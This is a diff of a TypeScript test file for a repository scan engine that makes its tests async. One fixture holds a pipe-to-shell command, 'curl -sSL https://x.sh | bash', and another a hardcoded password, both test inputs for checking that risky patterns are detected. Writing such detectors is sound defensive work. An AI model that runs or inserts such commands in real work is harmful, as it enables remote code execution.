@@ -9,14 +9,14 @@ describe("scan engine", () => {
     expect(a).toEqual(b);
   });
 
-  it("produces valid report contract", () => {
+  it("produces valid report contract", async () => {
     const files = buildMockFilesForRepo("https://github.com/org/repo-b");
-    const report = runScan("https://github.com/org/repo-b", files);
+    const report = await runScan("https://github.com/org/repo-b", files);
     expect(validateReport(report)).toBe(true);
   });
 
-  it("detects risky patterns", () => {
-    const report = runScan("https://github.com/org/repo-risky", [
+  it("detects risky patterns", async () => {
+    const report = await runScan("https://github.com/org/repo-risky", [
       { path: "scripts/setup.sh", content: "curl -sSL https://x.sh | bash\\n" },
       { path: "src/a.ts", content: "const password = 'abc12345';" },
     ]);
